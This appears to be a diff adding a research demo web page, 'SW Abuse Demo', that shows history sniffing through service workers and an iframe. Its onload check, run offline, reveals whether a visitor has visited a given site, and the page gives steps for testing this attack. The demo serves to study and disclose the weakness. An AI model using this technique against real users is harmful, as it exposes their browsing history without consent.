@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<link rel="shortcut icon" href="../Resources/hmbct.png" />
+	
+</head>
+<body>
+
+  </body>
+</html>
+
+<!doctype html><html>
+  <head><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1">
+   <head>
+    <title>SW_Demo</title><meta name=theme-color content=#2e3aa1>
+    <link rel=manifest href=../../manifest2.json>
+    <link rel="shortcut icon" href=../../images/logo-32x32.png>
+    <link rel=stylesheet href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel=stylesheet href=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.indigo-pink.min.css>    
+    <script src=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js></script>
+    <link rel=stylesheet href=../../styles/main.css>
+	   <script type='text/javascript'>
+	function get_frame_details(){
+		//var sw = document.getElementById('targetFrame').contentWindow.navigator.serviceWorker.controller;
+		//console.log(sw)
+		var tframe = document.getElementById('targetFrame')
+		tframe.onload = () => {
+		   console.log('iframe is completely loaded');
+		   alert('iframe loaded')
+		   //var sw = document.getElementById('targetFrame').contentWindow.navigator.serviceWorker.controller;
+		   //console.log(sw)
+		}
+	}
+	
+	window.addEventListener('DOMContentLoaded', (event) => {
+		
+		console.log(document.getElementById('targetFrame'))
+		console.log('DOM fully loaded and parsed');
+		get_frame_details()
+	});
+		
+	function add_iframe(){
+		var iframe = document.getElementById('targetFrame');
+		iframe.src = document.getElementById('txtFrameSrc').value
+		console.log('iframe.contentWindow =', iframe.contentWindow);
+	}
+		
+	if('serviceWorker' in navigator) {
+  		navigator.serviceWorker.register('./offline_sw.js');
+	};
+    
+    </script>
+  </head>
+<body>
+  <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+  <header class=mdl-layout__header>
+    <div class=mdl-layout__header-row><span class=mdl-layout-title>SW Abuse Demo - StealthierPushExe</span>
+      <div class=mdl-layout-spacer></div>
+      <nav class="mdl-navigation"><a class=mdl-navigation__link href=https://demopwa.github.io/sw_index.html>Home</a> </nav>
+    </div>
+  </header>
+    <main>
+        <h1> History Sniffing via SW and Iframe </h1>
+	<div>
+		<p>To test this attack, Make sure you are offline. </br> Next, enter a URL of a site that has SW (with offline support) that has not been visited before. </br>
+			Then Click button 'Add Frame' to set it as Frame's URL. At this point, no alert should appear. Connect to internet again and visitng the same URL to make sure its SW is registered.
+	  	</br> Repeat the steps again in offline mode. Find below some example sites that can be used for testing. 
+		</p>
+	  	<ul>
+	        	<li>https://love2dev.com/</li>
+	        </ul>
+		<h3>Enter Frame Src URL: </h3>
+		<input type="text" id = 'txtFrameSrc'>
+		<input type="button" value="Add Frame" onclick=add_iframe()>
+		</div>
+ 	 <div>
+
+		<iframe id='targetFrame'  height="500" width="800" title="Iframe Example">		
+	
+		</iframe> 
+	</div>
+	    
+  </main>
+  </div>
+  
+  
+ </body>
+ </html>
